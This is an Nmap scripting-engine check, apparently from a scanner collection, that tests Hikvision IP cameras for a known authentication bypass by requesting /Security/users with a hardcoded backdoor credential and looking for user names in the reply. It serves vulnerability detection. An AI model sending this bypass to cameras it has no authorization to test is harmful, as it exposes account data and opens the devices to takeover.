local http = require "http"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"


description = [[
Hikvision IP Camera versions 5.2.0 - 5.3.9 (Builds 140721 < 170109) - 访问控制绕过
后门文件，可用于重置密码
]]


author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "hikvision", "hikvision_backdoor_05", "vuln_detect" }

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	local back_door_auth_args = "auth=YWRtaW46MTEK"
	local base_url = "/Security/users?"
	local uri = base_url..back_door_auth_args
	local output = stdnse.output_table()
	
	local response = http.get(host, port, uri)

	if response.status == 200 then
		content = response.body
		if string.find(content, "id") and string.find(content, "userName") ~= nil then
			output = "Found vulnerable."
		else
			output = "Not vulnerable."
		end
	else
		output = "Not vulnerable."
	end
	
	return output
	
end

